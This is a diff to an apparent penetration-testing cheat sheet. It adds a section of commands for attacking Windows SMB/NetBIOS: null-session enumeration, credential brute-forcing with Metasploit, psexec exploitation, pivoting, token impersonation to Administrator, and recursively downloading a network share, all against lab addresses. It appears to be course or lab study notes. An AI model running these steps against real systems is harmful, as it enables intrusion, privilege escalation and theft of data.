@@ -811,7 +811,7 @@ CrunchBase
 usenet
 newsgroups
 ```
-####Fierce and Maltigo
+##### Fierce and Maltigo
 ```bash
 Top choice while performing DNS enumeration
 ```
@@ -821,6 +821,47 @@ winfo 192.168.1.123 -n
 Null Session
 net use \\192.168.1.112\IPC$ "" /u:""
 rpcclient -N -U "" 192.168.119.112
+```
+##### Enum NetBIOS Hacking
+```bash
+C:\>nbtstat -a 10.130.40.70
+nmblookup -A 10.130.40.70
+The <20> identifier signifies that the host has file shares enabled.
+C:\>net use \\10.130.40.70\IPC$ "" /u:""
+C:>net view \\10.130.40.70
+smbclient -L //10.130.40.70
+
+https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
+https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
+
+NEED TO START POSTGRESQL
+systemctl enable postgresql
+msfdb init
+msf > use auxiliary/scanner/smb/smb_login
+nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=administrator,smbpass=password
+
+EXPLOIT
+msf > use exploit/windows/smb/psexec
+/home/bruiser/impacket/examples/psexec.py
+
+PIVOT
+meterpreter > run autoroute -s 172.30.111.0/24
+meterpreter > background
+msf exploit(psexec) > use auxiliary/scanner/portscan/tcp
+
+LOAD INCOGNITO
+msf auxiliary(tcp) > sessions -i 1
+meterpreter > use incognito
+meterpreter > list_tokens -u
+
+meterpreter > impersonate_token eLS-Win7\\Administrator
+meterpreter > shell
+C:\Windows\system32>net view 172.30.111.10
+meterpreter > background
+msf auxiliary(tcp) > use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(smb_enumshares) > sessions -i 1
+C:\Windows\system32>net use K: \\172.30.111.10\FooComShare
+meterpreter > download K:\\ Target -r
 
 
 ```
